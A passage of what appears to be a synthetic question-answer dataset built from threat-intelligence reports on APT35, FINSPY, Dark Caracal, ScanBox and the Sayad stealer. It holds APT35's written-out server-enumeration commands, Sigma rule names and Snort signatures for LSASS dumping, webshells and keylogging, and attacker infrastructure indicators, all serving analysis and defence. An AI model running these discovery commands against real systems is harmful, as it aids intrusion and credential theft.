(<https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_net_user_add.yml>)https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/ rules/windows/process_creation/win_net_user_add.yml\nNetsh Port or Application Allowed \u2013 (<https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_netsh_fw_add.yml>)https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/ rules/windows/process_creation/win_netsh_fw_add.yml\nNetsh RDP Port Opening \u2013 (<https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_netsh_allow_port_rdp.yml>)https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/ rules/windows/process_creation/win_netsh_allow_port_rdp.yml\nNon Interactive PowerShell \u2013 (<https://github.com/SigmaHQ/sigma/blob/1425ede905514b7dbf3c457561aaf2ff27274724/rules/windows/process_creation/win_non_interactive_powershell.yml>)https://github.com/SigmaHQ/sigma/blob/1425ede905514b7dbf3c457561aaf2ff27274724/ru les/windows/process_creation/win_non_interactive_powershell.yml\nPowershell Defender Exclusion \u2013 (<https://github.com/SigmaHQ/sigma/blob/682e0458a336c3a6e93b18f7e972e1d67ef01598/rules/windows/process_creation/win_powershell_defender_exclusion.yml>)https://github.com/SigmaHQ/sigma/blob/682e0458a336c3a6e93b18f7e972e1d67ef01598/r ules/windows/process_creation/win_powershell_defender_exclusion.yml\nPowerShell Get-Process LSASS \u2013 (<https://github.com/SigmaHQ/sigma/blob/1ff5e226ad8bed34916c16ccc77ba281ca3203ae/rules/windows/process_creation/win_susp_powershell_getprocess_lsass.yml>)https://github.com/SigmaHQ/sigma/blob/1ff5e226ad8bed34916c16ccc77ba281ca3203ae/ru les/windows/process_creation/win_susp_powershell_getprocess_lsass.yml\nProcess Dump via Comsvcs DLL \u2013 (<https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_susp_comsvcs_procdump.yml>)https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/ rules/windows/process_creation/win_susp_comsvcs_procdump.yml\nQuick Execution of a Series of Suspicious Commands \u2013 (<https://github.com/SigmaHQ/sigma/blob/ed4e771700681b36eb8dd74a13dffc94c857bb46/rules/windows/process_creation/win_multiple_suspicious_cli.yml>)https://github.com/SigmaHQ/sigma/blob/ed4e771700681b36eb8dd74a13dffc94c857bb46/ rules/windows/process_creation/win_multiple_suspicious_cli.yml\nRare Scheduled Task Creations \u2013 (<https://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/rules/windows/other/taskscheduler/win_rare_schtask_creation.yml>)https://github.com/SigmaHQ/sigma/blob/04f72b9e78f196544f8f1331b4d9158df34d7ecf/ru les/windows/other/taskscheduler/win_rare_schtask_creation.yml\nService Execution \u2013 (<https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_service_execution.yml>)https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/ rules/windows/process_creation/win_service_execution.yml\nShells Spawned by Web Servers \u2013 (<https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_webshell_spawn.yml>)https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/ rules/windows/process_creation/win_webshell_spawn.yml\nSuspicious PowerShell Parent Process \u2013 (<https://github.com/SigmaHQ/sigma/blob/6f5271275e9ac22be9ded8b9252bce064e524153/rules/windows/process_creation/win_susp_powershell_parent_process.yml>)https://github.com/SigmaHQ/sigma/blob/6f5271275e9ac22be9ded8b9252bce064e524153/ rules/windows/process_creation/win_susp_powershell_parent_process.yml\nSuspicious Script Execution From Temp Folder \u2013 (<https://github.com/SigmaHQ/sigma/blob/ed4e771700681b36eb8dd74a13dffc94c857bb46/rules/windows/process_creation/win_susp_script_exec_from_temp.yml>)https://github.com/SigmaHQ/sigma/blob/ed4e771700681b36eb8dd74a13dffc94c857bb46/ rules/windows/process_creation/win_susp_script_exec_from_temp.yml\nWdigest Enable UseLogonCredential \u2013 (<https://github.com/SigmaHQ/sigma/blob/503df469687fe4d14d2119a95723485d079ec0d9/rules/windows/registry_event/sysmon_wdigest_enable_uselogoncredential.yml>)https://github.com/SigmaHQ/sigma/blob/503df469687fe4d14d2119a95723485d079ec0d9/ rules/windows/registry_event/sysmon_wdigest_enable_uselogoncredential.yml\nWebshell Detection With Command Line Keywords \u2013 (<https://github.com/SigmaHQ/sigma/blob/1cfca93354d25e458db40f8d48403602b46bbf03/rules/windows/process_creation/win_webshell_detection.yml>)https://github.com/SigmaHQ/sigma/blob/1cfca93354d25e458db40f8d48403602b46bbf03 /rules/windows/process_creation/win_webshell_detection.yml\nWindows Defender Real-Time Protection Disabled \u2013 (<https://github.com/SigmaHQ/sigma/blob/57cdfd261266b81255e330723f4adf270fc4c4f8/rules/windows/registry_event/registry_event_defender_realtime_protection_disabled.yml>)https://github.com/SigmaHQ/sigma/blob/57cdfd261266b81255e330723f4adf270fc4c4f8/r ules/windows/registry_event/registry_event_defender_realtime_protection_disabled.yml\nWindows Defender Threat Detection Disabled \u2013 (<https://github.com/SigmaHQ/sigma/blob/57cdfd261266b81255e330723f4adf270fc4c4f8/rules/windows/registry_event/registry_event_defender_disabled.yml>)https://github.com/SigmaHQ/sigma/blob/57cdfd261266b81255e330723f4adf270fc4c4f8/r ules/windows/registry_event/registry_event_defender_disabled.yml\nWindows Shell Spawning Suspicious Program \u2013 (<https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/process_creation/win_shell_spawn_susp_program.yml>)https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/ rules/windows/process_creation/win_shell_spawn_susp_program.yml\nWindows Suspicious Use Of Web Request in CommandLine \u2013 (<https://github.com/SigmaHQ/sigma/blob/98d7380a40d503ffd225420f7318b79d9f5097b8/rules/windows/process_creation/process_creation_susp_web_request_cmd.yml>)https://github.com/SigmaHQ/sigma/blob/98d7380a40d503ffd225420f7318b79d9f5097b8 /rules/windows/process_creation/process_creation_susp_web_request_cmd.yml\nWindows Webshell Creation \u2013 (<https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/rules/windows/file_event/sysmon_webshell_creation_detect.yml>)https://github.com/SigmaHQ/sigma/blob/ab814cbc408234eddf538bc893fcbe00c32ca2e9/ rules/windows/file_event/sysmon_webshell_creation_detect.yml\n\nHow did APT35 leverage native Windows binaries to enumerate the exploited server, and what specific commands were used? Additionally, explain the significance of using these commands in the context of their automated discovery tasks.",
    "output": "APT35 used native Windows binaries to enumerate the exploited server in an automated fashion. The specific commands executed included 'net.exe user', 'ipconfig.exe /all', 'powershell.exe (multiple commands)', and 'quser.exe'. These discovery tasks were executed via a web shell. The threat actors also used the PowerShell module Get-WMIObject to collect the name and IP address of the domain controller with the command 'Get-WMIObject Win32_NTDomain | findstr DomainController'. Additionally, they retrieved an email address from the compromised Exchange server using the command 'Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; Get-Recipient | Select Name -ExpandProperty EmailAddresses -first 1 | Select SmtpAddress | ft -hidetableheaders'. The significance of using these commands is that they allow the threat actors to gather critical information about the server environment, such as user accounts, network configurations, and domain controllers, which can aid in further exploitation and lateral movement within the network.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Additional Information\nWe recommend that you block access to services on the Internet that are not necessary and / or may create additional risks (such as Discord).\nWe draw your attention to the correct configuration of security policies and security measures for your computer, namely:\nprohibit MS Office processes (in particular, WINWORD.EXE) from running potentially dangerous programs, in this case - wscript.exe (Sysmon EventID: 1);\nmonitor network connections (Sysmon EventID: 3.22) of potentially dangerous programs (powershell.exe, etc.)\n\nAnswer this question based on the above context: How can cybersecurity experts mitigate the risk of malicious scripts being executed through Microsoft Office applications, particularly in the context of the UAC-0056 group's tactics? Explain the importance of configuring security policies and monitoring network connections in this scenario.",
    "output": "To mitigate the risk of malicious scripts being executed through Microsoft Office applications, especially considering the tactics employed by the UAC-0056 group, cybersecurity experts should implement several key measures. Firstly, it is crucial to configure security policies to prohibit MS Office processes, such as WINWORD.EXE, from running potentially dangerous programs like wscript.exe. This can be achieved by setting appropriate Sysmon EventID: 1 rules to monitor and block these actions. Additionally, experts should actively monitor network connections (Sysmon EventID: 3.22) of potentially dangerous programs like powershell.exe. By doing so, they can detect and prevent unauthorized network activities that could lead to the download and execution of malicious payloads, such as those hosted on services like Discord. These measures ensure that even if a malicious document is opened, the embedded scripts cannot execute harmful commands or establish malicious network connections.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Background\nThe Tibetan community has been the target of malware\u00adenabled espionage campaigns for over a decade. The attackers responsible for these campaigns are relentless in their attempts to compromise networks and harvest sensitive information. These attacks often demonstrate high levels of sophistication in the social engineering used to entice targets to open malicious attachments or links, but are typically . A common technique is the use of document\u00adbased malware. In a recent on targeted malware attacks against civil society, which included six Tibetan groups, we found that document\u00adbased malware was the most common attack vector, accounting in some cases for up to 95 percent of all attacks against specific Tibetan groups.\nThe Tibetan community has recognized these patterns and made efforts to change user behaviors to mitigate the attacks. For example, groups have started a digital security training campaign called , which urges users to avoid sending or opening email attachments, and to use cloud\u00adbased storage (e.g., Google Drive) to send files instead. However, as the community\nchanges behaviors, so do the attackers.\nRecently, Palo Alto Networks reported on a years\u00adlong espionage campaign they call \"\" that targeted Tibetan and Uyghur groups (as well as government agencies in Russia and India). The Scarlet Mimic campaigns are a typical example of the attacks civil society faces. Carefully crafted (<http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0158>)email lures are sent to targets carrying exploits that leverage well\u00adknown vulnerabilities (e.g., , ), which used in campaigns against Tibetan groups frequently in recent years.\nIn this post, we show that servers used as malware C2 infrastructure by Scarlet Mimic are now hosting phishing pages designed to steal Google credentials from Tibetan activists and journalists. This shift in tactics from malware to phishing campaigns suggests that the attackers are adapting to behavioral changes in the Tibetan community. In the following sections, we provide an overview of malware campaigns connected to Scarlet Mimic we observed targeting Tibetan groups from 2013\u00ad2014, and analyze how the same infrastructure is now being used to host a wave of phishing attacks. We conclude with discussion of what may have motivated this change in tactics, and provide recommendations for targeted users.\nRead the text above and answer this question: Why did the Scarlet Mimic APT group shift their tactics from using malware to phishing campaigns against Tibetan activists and journalists?",
    "output": "The Scarlet Mimic APT group shifted their tactics from using malware to phishing campaigns due to behavioral changes within the Tibetan community. The community had begun implementing digital security measures, such as avoiding email attachments and using cloud-based storage for file sharing, to mitigate malware-based attacks. This adaptation forced the attackers to adjust their methods to continue compromising their targets effectively.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Vulnerability Used to Target Russian Speakers\nThe malicious document, \"\u041f\u0440\u043e\u0435\u043a\u0442.doc\" (MD5: fe5c4d6bb78e170abf5cf3741868ea4c), might have been used to target a Russian speaker. Upon successful exploitation of CVE-2017-8759, the document downloads multiple components (details follow), and eventually launches a FINSPY payload (MD5: a7b990d5f57b244dd17e9a937a41e7f5).\nFINSPY malware, also reported as FinFisher or (<http://download.microsoft.com/download/E/B/0/EB0F50CC-989C-4B66-B7F6-68CD3DC90DE3/Microsoft_Security_Intelligence_Report_Volume_21_English.pdf>)WingBird, is available for purchase as part of a \"lawful intercept\" capability. Based on this and previous use of (<https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199_useda.html>)FINSPY, we assess with moderate confidence that this malicious document was used by a nation-state to target a Russian-speaking entity for cyber espionage purposes. Additional detections by FireEye's Dynamic Threat Intelligence system indicates that related activity, though potentially for a different client, might have occurred as early as July 2017.\nBig Headline: CVE-2017-8759 WSDL Parser Code Injection\nA code injection vulnerability exists in the WSDL parser module within the PrintClientProxy method ((<http://referencesource.microsoft.com/#System.Runtime.Remoting/metadata/wsdlparser.cs,6111>)http://referencesource.microsoft.com/ - System.Runtime.Remoting/metadata/wsdlparser.cs,6111). The IsValidUrl does not perform correct validation if provided data that contains a CRLF sequence. This allows an attacker to inject and execute arbitrary code. A portion of the vulnerable code is shown in Figure 1.\nWhen multiple address definitions are provided in a SOAP response, the code inserts the \"//base.ConfigureProxy(this.GetType(),\" string after the first address, commenting out the remaining addresses. However, if a CRLF sequence is in the additional addresses, the code following the CRLF will not be commented out. Figure 2 shows that due to lack validation of CRLF, a System.Diagnostics.Process.Start method call is injected. The generated code will be compiled by csc.exe of .NET framework, and loaded by the Office executables as a DLL.\nBig Headline: The In-the-Wild Attacks\nThe payload retrieves the malicious SOAP WSDL definition from an attacker-controlled server. The WSDL parser, implemented in System.Runtime.Remoting.ni.dll of .NET framework, parses the content and generates a .cs source code at the working directory. The csc.exe of .NET framework then compiles the generated source code into a library, namely http[url path].dll. Microsoft Office then loads the library, completing the exploitation stage. Figure 4 shows an example library loaded as a result of exploitation.\nUpon successful exploitation, the injected code creates a new process and leverages mshta.exe to retrieve a HTA script named \"word.db\" from the same server. The HTA script removes the source code, compiled DLL and the PDB\nfiles from disk and then downloads and executes the FINSPY malware named \"left.jpg,\" which in spite of the .jpg extension and \"image/jpeg\" content-type, is actually an executable. Figure 5 shows the details of the PCAP of this malware transfer.\nThe malware will be placed at %appdata%\\Microsoft\\Windows\\OfficeUpdte-KB[ 6 random numbers ].exe. Figure 6 shows the process create chain under Process Monitor.\nBig Headline: The Malware\nThe \"left.jpg\" (md5: a7b990d5f57b244dd17e9a937a41e7f5) is a variant of FINSPY. It leverages heavily obfuscated code that employs a built-in virtual machine \u2013 among other anti-analysis techniques \u2013 to make reversing more difficult. As likely another unique anti-analysis technique, it parses its own full path and searches for the string representation of its own MD5 hash. Many resources, such as analysis tools and sandboxes, rename files/samples to their MD5 hash in order to ensure unique filenames. This variant runs with a mutex of \"WininetStartupMutex0\".\nBig Headline: Conclusion\nCVE-2017-8759 is the second zero-day vulnerability used to distribute FINSPY uncovered by FireEye in 2017. These exposures demonstrate the significant resources available to \"lawful intercept\" companies and their customers. Furthermore, FINSPY has been sold to multiple clients, suggesting the vulnerability was being used against other targets.\nIt is possible that CVE-2017-8759 was being used by additional actors. While we have not found evidence of this, the zero day being used to distribute FINSPY in April 2017, CVE-2017-0199 was simultaneously being used by a financially motivated actor. If the actors behind FINSPY obtained this vulnerability from the same source used previously, it is possible that source sold it to additional actors.\nQuestion: Describe the multi-stage process through which the FINSPY malware is delivered and executed upon successful exploitation of CVE-2017-8759. What specific techniques are used to hide the malicious activities and ensure persistence?",
    "output": "Answer: Upon successful exploitation of CVE-2017-8759, the payload retrieves a malicious SOAP WSDL definition from an attacker-controlled server. The WSDL parser, implemented in System.Runtime.Remoting.ni.dll of the .NET framework, parses the content and generates a .cs source code file in the working directory. This source code is then compiled by csc.exe into a library, which is subsequently loaded by Microsoft Office, completing the exploitation stage. The injected code creates a new process using mshta.exe to retrieve an HTA script named 'word.db' from the same server. This HTA script removes the source code, compiled DLL, and PDB files from the disk and then downloads and executes the FINSPY malware disguised as 'left.jpg'. Despite its .jpg extension and 'image/jpeg' content-type, 'left.jpg' is actually an executable. The malware is placed at '%appdata%\\Microsoft\\Windows\\OfficeUpdte-KB[6 random numbers].exe'. The FINSPY variant uses heavily obfuscated code with a built-in virtual machine and other anti-analysis techniques to make reversing more difficult. It also parses its own full path and searches for the string representation of its own MD5 hash, a technique used to evade detection by analysis tools and sandboxes that rename files to their MD5 hash for uniqueness.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Infrastructure\nWhile analyzing adobeair[.]net, we uncovered sprawling infrastructure used by Dark Caracal. This infrastructure serves a broad set of purposes, including acting as storage for exfiltrated data, masquerading as an Android App Store hosting malware, delivering attacker commands to infected devices, and providing phishing content aimed at gathering credentials for various  well known services.\nWe found much of this infrastructure hosted on servers provided by Shinjiru, an offshore bulletproof hosting provider that allows its customers to host almost any content. WHOIS information listed for the adobeair[.]net C2 server led to the discovery of many of these domains, as did scanning of Shinjiru IP blocks for servers running a set of services. This acted as a fingerprint for Dark Caracal's infrastructure. To date, the following domains and IPs have been identified as connected to the infrastructure used by Dark Caracal.\nThe following relevant contact information has also been identified during this investigation.\nMedium Headline: Primary Command and Control Server\nAs noted, adobeair[.]net is hosted on Shinjiru. This bulletproof hosting company allows its customers to host almost any type of content, protects client identity, accepts Bitcoin for payment, and is more resilient than other providers to takedowns22 . Shinjiru has also been used to host many of the Dark Caracal Windows domains dating back over seven years to April 27th, 2010 (see a list of Windows malware domains in the Windows infrastructure section below).\nAt the time of writing, adobeair[.]net is currently live and running a fairly unique set of services. We have used this server as a fingerprint in the discovery of further related infrastructure. These services include XAMPP for Windows 5.6.31, Apache 2.4.26, MariaDB 10.1.25, PHP 5.6.31, phpMyAdmin 4.7.0, and OpenSSL 1.0.2. We confirmed these via an nmap scan of the adobeair server.23\n22 (<https://www.shinjiru.com/company/about-us/ >)https://www.shinjiru.com/company/about-us/\n23 (<https://www.apachefriends.org/download.html>)https://www.apachefriends.org/download.html\nThe adobeair[.]net C2 server had the Apache mod_status module enabled. This provides operators with information on server activity, performance, and a statistics page under /server-status that details connected clients and the server resources they are accessing. By programmatically monitoring this page, we were able to determine the source IPs of infected clients and admins logging into the console.\nThe adobeair[.]net server has, as of late September 2017, been moved to a new hosting provider, M247, and the operators have improved the security.\nWHOIS history for adobeair[.]net lists Nancy Razzouk with an email address of op13@mail[.]com as the registrant. We have identified the \"Nancy Razzouk\" persona as the SSL signer of the Windows malware samples and the registrant of multiple domains. Its reuse has helped identify further Dark Caracal infrastructure.\nMedium Headline: Watering Hole Server\nDuring this investigation, we determined this server is the only infrastructure we discovered that serves up malicious apps belonging to the Pallas malware family. A detailed analysis of these applications can be found under the Android Surveillanceware section. As with other Dark Caracal infrastructure, the secureandroid[.]info domain was also registered with the bulletproof hosting company Shinjiru.\nWe found links to these landing pages in the exfiltrated content of compromised devices, which indicates it is actively being used during the attack chain. As of December 2017 it appears that secureandroid[.]info has had its domain expire.\nMedium Headline: Phishing Domains\nWe identified the Dark Caracal domain tweetsfb[.]com while analyzing the secureandroid[.]info server source code. We identified two bit[.]ly URLs on this server that resolve to other pages on the tweetsfb site that were carefully crafted to look like the Facebook and Twitter login portals. The copyright dates suggest these pages are clones of the originals from 2015.\nThese bit[.]ly links and their respective resolving links are:\n\u2022 http://bit[.]ly/2j3r285 points to http://www.tweetsfb[.]com/services/100001472583690/twitter/articles/100001/\n\u2022 http://bit[.]ly/2iByHcu points to http://tweetsfb[.]com/services/100001472583690/facebook/groups/100002/\nThe tweetsfb[.]com domain was found to share an IP address (172.94.17.147) with the following additional domains.\nWe were able to find additional phishing campaigns in VirusTotal that referenced fbarticles[.]com. While fbarticles was registered by the op13@mail[.]com address with the name \"Hadi Mazeh,\" the WHOIS information for fbtweets was private.\nNote: we identified three further domains \u2014 \"facebookservices[.]org\", \"gmailservices[.]org\", and \"twiterservices[.]org\" that were once a part of this campaign. Those domains now appear to be sinkholed.\nWhen we discovered these domains, the threat actors had already taken them offline and another individual had purchased them. This individual is associated with unrelated domains that are connected to other APT reports. However, we noticed that the individual purchased the domains after the APT reports went public. While we're not sure why this individual is purchasing, sinkholing, and monitoring these domains, we think it's an interesting note.\nMedium Headline: Windows C2 Servers\nThe Windows server infrastructure has a much longer history than the Android infrastructure, showing that the actors are willing to evolve to new technologies, such as mobile, as they become more valuable targets.\nThe Windows malware servers hosted control panels for multiple campaigns using various malware that included IRIS RAT, Bandook, and Arcom RAT. We found these servers hosting exfiltrated desktop content, Windows malware signed by \"alecouperus@mail[.]com\", and the CrossRAT trojan.\nAll of these domains share the same IP on more than one occasion and have migrated between hosting providers in the same time window. Most of these domains were hosted on Shinjiru, the same hosting server for the Android campaign.\nThe following screenshot shows HTTP 200 OK response codes for http://<server>/<Payload>/\nEach of the following directories contained a login panel for either IRIS RAT or Arcom RAT.\nUsing the Wayback Machine we identified the signature Win32 apache server running on skypeupdate[.]com in 2016. This server was first seen resolving to an IP belonging to Shinjiru in late 2013 and last seen resolving to a Shinjiru IP in late 2016.\nThe oldest domain we identified as part of this infrastructure is flexberry[.]com. The following screenshot shows passive DNS resolution dating back to 2010.\n\nHow does the infrastructure used by Dark Caracal facilitate its espionage activities, and what specific services were identified on the primary command and control server?",
    "output": "The infrastructure used by Dark Caracal facilitates espionage activities by serving multiple purposes such as storing exfiltrated data, masquerading as an Android App Store to distribute malware, delivering attacker commands to infected devices, and providing phishing content to gather credentials for various well-known services. Specific services identified on the primary command and control server, adobeair[.]net, include XAMPP for Windows 5.6.31, Apache 2.4.26, MariaDB 10.1.25, PHP 5.6.31, phpMyAdmin 4.7.0, and OpenSSL 1.0.2. These services were confirmed through an nmap scan of the server.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: The Framework\nWhilst all four implementations share the same codebase, there are some minor differences in their implementations. These differences may show that different attackers are using the ScanBox framework.\nWe've outlined a few key differences we identified below:\nMalicious code was delivered in a single block of JavaScript on both webmailgoogle[.]com and foundationssl[.]com. The domains qoog1e[.]com and googlecaches[.]com selectively loaded extra plugins from separate files:\nWe can see how these differ by comparing two exploit kits side by side:\nA motivation for selectively loading plugins is likely to be to prevent crashes or any errors appearing (which may alert the compromised site's owner) when the page is loaded \u2013 as some of the plugins are only compatible with specific browsers. Selectively loading plugins has the added bonus of slightly reducing access to the attacker's code to researchers. Browsers the attackers are not interested in will be served the following placeholder instead of the malicious function:\nThe following ScanBox plugins are deployed on code.googlecaches[.]com, dependent upon the users browser:\nThere are further code differences too. Take for example the different implementations of software enumeration, by identifying whether certain files exist:\nFrom a developer's perspective, I know it's always a good idea to check the details of any exceptions that occur when writing code in order to create more stable applications. It's pleasing to see the ScanBox developers using good coding practices, though only if they're in the office!\nWhen identifying the security software, only the implementation found on foundationssl[.]com employs the full version of some publicly available code[5] (the section of code with informational messages such as \"\"Folder was found!\"\"). In all other versions only a subsection of the same code is used.\nAt this point we've established that there are subtle variations between the ScanBox code deployed on different websites, however this could be due to differences in the expected environment of the targets the attackers wish to infect in each case, or upgrades to the framework.\nBig Headline: Analysis of associated attacker infrastructure\nIn order to potentially group the activity observed together, we analysed network infrastructure associated with the domains used by the attacker(s) deploying the ScanBox framework. Our analysis showed that there was little overlap both in terms of associated infrastructure and in terms of the malware families associated with that infrastructure.\nSummaries of each cluster are given below, whilst full details of the components which made up each are available in the Appendix.\nWe have been unable to identify any direct overlaps between the clusters, i.e. shared domains or IP addresses, neither have we been able to determine any softer linkages beyond the reuse of the GoDaddy registrar.\nOf course this could be due to lack of data points available to us \u2013 we welcome any additional data points the community are available to provide which show linkages between the clusters shown below.\nVisualisations of each cluster can be seen in the Maltego graphs below:\nBig Headline: Conclusions\nIn this post we've identified four affected websites, each of which would draw distinct audiences who would be valuable to different actors. We've also taken a look at the variations in how the framework was implemented, and found a few subtle differences in the implementations. Finally, we analysed the associated infrastructure with the attacker domains used in each case, and found no overlap between the clusters of activity.\nIn a similar fashion to our previous blog entry on potential overlap between APT1 and Putter Panda[6] , we can attempt to explain these differences with several hypotheses:\n1. The framework is used by a single group that target widely and upgrade or adapt their code for different targets, and are careful to avoid any overlap in infrastructure or in services used.\n2. Selections of actors share some resources, as per previous observations with similar kits by some security vendors[7].\n3. The exploit kits have been used by one group, and taken from public watering holes for their own use by other unrelated persons\nIn our experience, very few attackers have the patience to maintain completely distinct infrastructure with multiple registrars, name servers and hosting providers at the same time, therefore we have a low\nconfidence in hypothesis 1. In our view, the hypothesis with the highest probability is that groups of attackers share resources leading to overlaps \u2013 this appears to be an ever more common feature \u2013 with malware families, builders, and even sometimes hosting infrastructure being shared between disparate actors with a common goal. Sharing frameworks like ScanBox or other exploit kits allows less sophisticated actors (who were themselves unable to develop a tool like ScanBox) to conduct better attacks.\nBig Headline: Appendix - Snort Rules\nalert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"ScanBox Framework Plugin used in WateringHole Attacks\"; flow:from_server,established; file_data; content:\"=scanbox.info.\"; reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html; classtype:trojan-activity; sid:xxx; rev:1;)\nalert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"ScanBox Framework Java Detection used in WateringHole Attacks\"; flow:from_server,established; file_data; content:\"\\\"No Java or Disable\"; reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html; classtype:trojan-activity; sid:xxx; rev:1;)\nalert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"ScanBox Framework AV Detection used in WateringHole Attacks\"; flow:from_server,established; file_data; content:\"avg2012check()\"; reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html; classtype:trojan-activity; sid:xxx; rev:1;)\nalert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"ScanBox Framework and legitimate websites Flash Detection\"; flow:from_server,established; file_data; content:\"var flash=function()\n{}\\;flash.prototype.controlVersion=function\";\nreference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html; classtype:trojan-activity; sid:xxx; rev:1;)\nalert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"ScanBox Framework Local IP Detection\"; flow:from_server,established; file_data; content:\"if (evt.candidate) grepSDP(evt.candidate.candidate)\"; reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html; classtype:trojan-activity; sid:xxx; rev:1;)\nalert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"ScanBox Framework Javscript Keylogging\"; flow:from_server,established; file_data; content:\"CapsLock=currKey>=65&&currKey<=90\"; reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html; classtype:trojan-activity; sid:xxx; rev:1;)\nalert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"ScanBox Framework Navigator Plugin\nDetection\"; flow:from_server,established; file_data; content:\"navigator.plugins[x].filename.replace(/,/g,\"; reference:url,pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it-1.html; classtype:trojan-activity; sid:xxx; rev:1;)\nBig Headline: Appendix \u2013 IoCs\n[1] https://www.alienvault.com/open-threat-exchange/blog/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks\n[2] This appears to be a misconfiguration, as the attackers are looking for Chrome plugins on Firefox\n[3] This employs code from \"The Browser Hackers handbook\" The plugins deployed on \"qoogle.com\" are the same, though they utilise different plugin IDs \u2013 this may indicate that the framework allows you to select which plugins you wish to deploy, and then the entire framework is 'built' by a builder.\n[4] This is the key logger described by AlienVault, and using code previously published on sites such as CSDN\n[5] http://sc.mac.gd/vuldb/ssvid-60783\n[6] http://pwc.blogs.com/cyber_security_updates/2014/07/apt1-putter-panda-collaboration-or-a-shared-contractor.html\n[7] www.symantec.com/connect/blogs/how-elderwood-platform-fueling-2014-s-zero-day-attacks\n\nWhat are the hypotheses proposed to explain the differences in the ScanBox framework implementations, and which hypothesis is considered most probable based on the analysis?",
    "output": "Three hypotheses are proposed to explain the differences in the ScanBox framework implementations: 1. A single group targets widely and adapts their code for different targets while avoiding infrastructure overlap. 2. Different actors share some resources. 3. The framework is used by one group and then taken from public watering holes by others. Based on the analysis, the hypothesis with the highest probability is that groups of attackers share resources, leading to overlaps. This is supported by the observation that sharing frameworks like ScanBox allows less sophisticated actors to conduct better attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nThis week I got hold of a sample of \"Sayad\", so I ran it through our Vinsula Execution Engine (VEE) to find out what it does and how it works. Credit for sharing the sample of the malware goes to (<https://twitter.com/MalwareChannel>)@MalwareChannel.\nThe information this malware is able to steal and upload to a Web server controlled by the hackers is highly sensitive and would have an enormous impact on compromised individuals, businesses, and governments. Some of the tasks Sayad is designed to accomplish include:\nGet and send host system information, including:\nHost computer name\nInternal and external IPs\nLanguages installed\nUser name\nRunning processes\nOpen ports\nCapture and record keystrokes through a user mode key logger\nPeriodically capture information stored in the clipboard\nCollect and transfer user information for FTP Clients \u2013 FileZilla and WinSCP\nGet data account information for FileZilla FTP Server\nTransfer Kerio VPN client user configuration files\nCollect and transfer bookmarks for Chrome, Firefox, Internet Explorer, and Opera\nSteal browser cookies for Chrome, Firefox, Internet Explorer, and Opera\nCollect and transfer history for Chrome, Firefox, Internet Explorer, and Opera\nCapture any registered proxies\nGet and transfer the start URL for each installed browser\nCollect and transfer chat history for Skype, Yahoo Messenger, Pidgin, and GTalk\nSteal RDP, Putty accounts\nCollect VPN related account information for Proxifier and WinVPN\nDetermine if the currently logged on user is running as admin\nAt the time of writing of this post, the detection rate for Sayad malware binary (SHA2:8904836017bc20972a769f8d4d6beeo8388da3dof83e362e67f9fob6b1ae5c12) at (<https://www.virustotal.com/en/file/8904836017bc20972a769f8d4d6bee08388da3d0f83e362e67f9f0b6b1ae5c12/analysis/>)VirusTotal is zero.\nThere are several interesting aspects of Sayad malware, and after running the malicious executable through the Vinsula Execution Engine to analyze its behavior, I discovered that the initial executable titled WEXTRACT.exe 